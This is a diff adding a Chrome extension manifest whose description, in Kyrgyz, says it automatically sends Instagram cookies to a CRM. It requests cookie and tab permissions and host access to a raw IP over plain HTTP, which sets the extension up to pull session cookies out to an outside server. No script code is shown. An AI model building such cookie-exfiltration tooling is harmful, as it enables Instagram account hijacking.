@@ -1,0 +1,17 @@
+{
+  "manifest_version": 3,
+  "name": "Instagram CRM Cookie",
+  "version": "1.0",
+  "description": "Instagram cookie автоматтык CRM'ге жөнөтөт",
+  "permissions": ["cookies", "tabs", "storage"],
+  "host_permissions": ["https://*.instagram.com/*", "http://147.45.219.116/*"],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": ["http://147.45.219.116/*"],
+      "js": ["content.js"]
+    }
+  ]
+}
